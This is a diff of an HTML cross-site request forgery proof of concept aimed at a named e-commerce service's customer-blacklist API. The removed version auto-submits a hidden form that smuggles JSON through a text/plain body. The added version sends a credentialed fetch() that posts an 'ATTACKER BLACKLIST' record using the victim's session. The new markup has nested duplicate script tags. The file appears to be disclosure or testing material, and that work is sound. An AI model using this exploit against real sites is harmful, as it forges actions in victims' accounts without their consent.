@@ -4,12 +4,15 @@
     <title>CSRF PoC - Customer Blacklist</title>
 </head>
 <body>
-    <h2>CSRF PoC - Add Customer to Blacklist</h2>
-    <form id="csrfForm" action="https://www.sellingpilot.com/api/channel-integrator/orders/customer/blacklist?_xhr=true" method="POST" enctype="text/plain">
-        <input type="hidden" name='{"Name":"ATTACKER BLACKLIST","Email":"kadal@gmail.com","Phone":"02342932893","CountryCodeiso3":"AFG","CountryCodeiso2":"AF","CountryName":"Afghanistan","StateCode":"DAY","StateName":"Daykundi","ZipCode":"34343","Reason":"Other","x":"' value='"}'>
-    </form>
-    <script>
-        document.getElementById('csrfForm').submit();
-    </script>
+   <script>
+   <script>
+fetch('https://www.sellingpilot.com/api/channel-integrator/orders/customer/blacklist?_xhr=false', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({"Name":"ATTACKER BLACKLIST","Email":"kadal@gmail.com","Phone":"02342932893","CountryCodeiso3":"AFG","CountryCodeiso2":"AF","CountryName":"Afghanistan","StateCode":"DAY","StateName":"Daykundi","ZipCode":"34343","Reason":"Other"})
+});
+</script>
+   </script>
 </body>
 </html>
